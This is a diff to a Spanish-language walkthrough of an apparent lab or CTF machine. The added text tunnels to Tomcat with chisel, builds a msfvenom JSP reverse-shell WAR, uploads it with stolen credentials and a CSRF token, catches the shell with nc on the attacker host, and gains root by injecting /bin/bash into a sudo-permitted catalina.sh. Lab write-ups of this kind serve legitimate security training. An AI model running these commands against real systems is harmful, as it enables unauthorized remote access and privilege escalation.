@@ -639,7 +639,7 @@ ssh-keygen -R 172.17.0.2
 
 Probamos acceso con los usuarios y contraseñas obtenidas
 
-Me funcionó con usuario: rosa y contraseña: ultramegaverypasswordhack 
+Me funcionó con usuario: **rosa** y contraseña: **ultramegaverypasswordhack** 
 
 ```bash
 ssh rosa@172.17.0.2
@@ -1037,9 +1037,9 @@ curl -u veryhardpassword:admin12345password http://localhost:8080/manager/text/l
 
 ### **Continuando con la escalada de privilegios:**
 
-## Redirigir el puerto 8080 con chisel para acceder a Tomcat
+## Redirigir el puerto 8080 con **chisel** para acceder a Tomcat
 
-Instalamos chisel:
+Instalamos **chisel**:
 
 ```sh
 wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
@@ -1049,16 +1049,16 @@ chmod +x chisel
 sudo mv chisel /usr/local/bin/
 ```
 
-Levantamos un servidor
+Levantamos un servidor **chisel** en el **host**
 
 ```sh
-chisel server --reverse -p 1234
+chisel server --reverse -p 8081
 ```
 
 ```sh
-2025/07/23 21:52:37 server: Reverse tunnelling enabled
-2025/07/23 21:52:37 server: Fingerprint bf5ofzMc+e65zCi7zZqudtmhvOCAM814IPllbNrxv5M=
-2025/07/23 21:52:37 server: Listening on http://0.0.0.0:1234
+2025/07/24 02:23:44 server: Reverse tunnelling enabled
+2025/07/24 02:23:44 server: Fingerprint re0X/MRV3g5cRb+CO6g3Kapr8vS6ok5EYUfczObgkRU=
+2025/07/24 02:23:44 server: Listening on http://0.0.0.0:8081
 ```
 
 Estamos esperando conexiones reversas de la víctima
@@ -1107,11 +1107,24 @@ En @rosa  verificamos que el chisel se ejecuta:
     https://github.com/jpillora/chisel
 ```
 
-Crear un tunel reverso a mi **host** desde **@rosa**
+Crear un tunel reverso desde **@rosa** a mi host
 
 ```sh
-/tmp/chisel client <HOST_IP>:1234 R:4444:127.0.0.1:8080
+/tmp/chisel client 192.168.1.9:8081 R:4444:127.0.0.1:8080
 ```
+
+```sh
+2025/07/24 09:25:16 client: Connecting to ws://192.168.1.9:8081
+2025/07/24 09:25:16 client: Connected (Latency 124.325µs)
+```
+
+Vemos el contenido del tomcat en el **host**
+
+```sh
+curl http://127.0.0.1:4444 > result_tomcat.txt
+```
+
+Nos dio [result_tomcat.txt](./Files/result_tomcat.txt)
 
 Probamos si podemos hacer despliegues:
 
@@ -1128,3 +1141,152 @@ curl -u tomitoma:supersecurepasswordultra http://127.0.0.1:4444/manager/html > m
 ```
 
 [manager.html](./Files/manager.html)  confirma que ya tenemos acceso al Tomcat Web Application Manager con credenciales válidas y privilegios suficientes.
+
+### Usamos metasploit para generar un .war
+
+Enviamos el shell.war al tomcat
+
+en en **host** usamos
+
+```sh
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.9 LPORT=9001 -f war -o shell.war
+```
+
+```
+Payload size: 1090 bytes
+Final size of war file: 1090 bytes
+Saved as: shell.war
+```
+
+Capturamos las coockies de manager/html
+
+```sh
+curl -c cookies.txt -u tomitoma:supersecurepasswordultra http://127.0.0.1:4444/manager/html -o response.html
+```
+
+Extraemos el token de CSRF_NONCE
+
+```sh
+grep -oP 'org.apache.catalina.filters.CSRF_NONCE=\K[A-F0-9]+' response.html
+```
+
+```
+B09FF80B23E3678D20D82A504BD57236
+```
+
+Usamos el token y las cookies para enviar el **shell.war** en la petición post:
+
+```sh
+curl -b cookies.txt -u tomitoma:supersecurepasswordultra   -F "deployWar=@shell.war"   "http://127.0.0.1:4444/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=B09FF80B23E3678D20D82A504BD57236"
+```
+
+Abrimos una terminal con **@rosa**  con password **ultramegaverypasswordhack**
+
+```sh
+ssh rosa@172.17.0.2
+```
+
+Verificamos el nombre del .jsp que queremos ejecutar
+
+```sh
+jar -tf shell.war
+```
+
+```sh
+WEB-INF/
+WEB-INF/web.xml
+lxvguuyhu.jsp
+```
+
+Nos colocamos a la escucha de la shell con **nc**
+
+```sh
+nc -nlvp 9001
+```
+
+Ahora ejecutamos en el **host** :
+
+```sh
+curl http://127.0.0.1:4444/shell/lxvguuyhu.jsp
+```
+
+y en la terminal donde estábamos escuchando **nc** ahora vemos:
+
+```
+CConnection received on 172.17.0.2 57130
+whoami
+tomcat
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+uname -a
+Linux b0f9f04a5604 6.1.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Sat, 07 Jan 2023 15:10:07 +0000 x86_64 x86_64 x86_64 GNU/Linux
+pwd
+```
+
+## Ahora que estamos como usuario tomcat
+
+Vemos los permisos sudo
+
+```sh
+sudo -l
+```
+
+```sh
+Matching Defaults entries for tomcat on b0f9f04a5604:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tomcat may run the following commands on b0f9f04a5604:
+    (ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh
+```
+
+Vemos si tenemos permiso en /opt/tomcat/bin/catalina.sh para desde allí escalar a root
+
+```sh
+ls -la /opt/tomcat/bin/catalina.sh
+```
+
+```
+-rwxr-xr-x 1 tomcat tomcat 25323 Aug  2  2024 /opt/tomcat/bin/catalina.sh
+```
+
+Quiero insertar al catalina.sh un /bin/bash en la segunda línea, para abrir una terminal como **root** :
+
+```sh
+sed -i '1a /bin/bash' /opt/tomcat/bin/catalina.sh
+```
+
+Verificamos la modificación:
+
+```sh
+cat /opt/tomcat/bin/catalina.sh
+```
+
+```
+#!/bin/sh
+/bin/bash
+
+# Licensed to the Apache Software Foundation (ASF) under one or more
+# contributor license agreements.  See the NOTICE file distributed with
+...
+```
+
+## Ahora pasamos a ser usuario root
+
+Iniciamos el script
+
+```sh
+sudo /opt/tomcat/bin/catalina.sh
+```
+
+Verificamos el usuario en el que estamos ahora:
+
+```sh
+whoami
+```
+
+```
+root
+```
+
+
+y vemos que es root.
